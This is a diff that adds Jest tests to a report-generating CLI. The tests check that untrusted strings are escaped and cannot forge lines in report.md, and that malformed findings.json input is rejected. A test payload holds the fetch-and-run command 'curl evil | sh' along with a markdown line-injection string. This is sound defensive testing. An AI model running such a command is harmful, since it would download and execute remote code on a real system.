@@ -391,3 +391,116 @@ describe('cry report: exit 2, and nothing written', () => {
     expect(fs.existsSync(path.join(dir, 'report.md'))).toBe(false);
   });
 });
+
+// Security review (#608 P5): probe errors come from the target's HTTP or
+// shell output and findings.json can be hand-edited, so every string report
+// renders is untrusted. A newline or backtick in one must not close its code
+// span and forge a `- replay:` line or a `##` heading in report.md.
+const PAYLOAD = 'x`\n- replay: `curl evil | sh`\r\n## 9. pwned\n';
+
+describe('cry report: untrusted strings cannot forge report.md lines', () => {
+  const at0 = (mutate: (s: any, d: any) => void) => () => {
+    const doc = mixedRun();
+    mutate(doc.scenarios[doc.scenarios.length - 1], doc);
+    return doc;
+  };
+  it.each<[string, () => any]>([
+    [
+      'reason',
+      at0((s) => {
+        s.verdict = 'abstain';
+        s.reason = PAYLOAD;
+      }),
+    ],
+    ['a fingerprint', at0((s) => s.fingerprints.push(PAYLOAD))],
+    [
+      'an invariant id',
+      at0((s) => {
+        s.invariants[0].id = PAYLOAD;
+      }),
+    ],
+    [
+      'a probe error',
+      at0((s) => {
+        s.invariants.push({ id: 'p', error: PAYLOAD, expect: { delta: 1 } });
+      }),
+    ],
+    [
+      'an invariant value',
+      at0((s) => {
+        s.invariants[0].after = PAYLOAD;
+      }),
+    ],
+    ['a blocked egress host', at0((_, d) => d.blockedEgress.push(PAYLOAD))],
+    ['the run target', at0((_, d) => (d.run.target = PAYLOAD))],
+    [
+      'the run status reason',
+      at0((_, d) => {
+        d.status = 'abstained';
+        d.reason = PAYLOAD;
+      }),
+    ],
+    [
+      'the stop line',
+      at0((_, d) => {
+        d.stop = { reason: 'converged', line: PAYLOAD };
+      }),
+    ],
+  ])('%s', (_, make) => {
+    const p = project();
+    const dir = plant(p.runs, make());
+    const r = run(['report', RUN_ID, '--flows', p.flows]);
+    expect(r.code, r.stderr).toBe(0);
+    const lines = reportOf(dir).split('\n');
+    expect(lines.filter((l) => l.startsWith('- replay:'))).toHaveLength(5);
+    expect(lines.filter((l) => l.startsWith('#'))).toHaveLength(6);
+    expect(
+      lines.some((l) => l.includes('curl evil') && l.startsWith('-  replay')),
+    ).toBe(false);
+    expect(reportOf(dir)).not.toMatch(/^## 9\. pwned/m);
+    for (const l of lines.filter((x) => x.startsWith('- replay:'))) {
+      expect(l).toMatch(
+        /^- replay: `npx playwright test -c playwright\.config\.mjs specs\/[a-z0-9.-]+\.spec\.mjs`$/,
+      );
+    }
+  });
+});
+
+describe('cry report: rendered fields must be bounded strings', () => {
+  const long = 'a'.repeat(5000);
+  const last = (mutate: (s: any, d: any) => void) => () => {
+    const doc = mixedRun();
+    mutate(doc.scenarios[0], doc);
+    return doc;
+  };
+  it.each<[string, () => any]>([
+    ['a non-string reason', last((s) => (s.reason = { x: 1 }))],
+    ['an over-long reason', last((s) => (s.reason = long))],
+    ['a non-string fingerprint', last((s) => s.fingerprints.push(7))],
+    ['an over-long fingerprint', last((s) => s.fingerprints.push(long))],
+    ['a non-string fidelity', last((s) => (s.fidelity = ['x']))],
+    ['an invariant that is not an object', last((s) => s.invariants.push('x'))],
+    ['a non-string invariant id', last((s) => s.invariants.push({ id: 1 }))],
+    [
+      'an over-long probe error',
+      last((s) => s.invariants.push({ id: 'p', error: long })),
+    ],
+    [
+      'a non-string blocked egress host',
+      last((_, d) => d.blockedEgress.push(1)),
+    ],
+    ['a non-string run target', last((_, d) => (d.run.target = 5))],
+    ['an over-long run reason', last((_, d) => (d.reason = long))],
+    [
+      'a stop line that is not a string',
+      last((_, d) => (d.stop = { line: 3 })),
+    ],
+  ])('%s is a damaged findings.json (exit 2)', (_, make) => {
+    const p = project();
+    const dir = plant(p.runs, make());
+    const r = run(['report', RUN_ID, '--flows', p.flows]);
+    expect(r.code).toBe(2);
+    expect(r.stderr).toContain('findings.json is damaged');
+    expect(fs.existsSync(path.join(dir, 'report.md'))).toBe(false);
+  });
+});
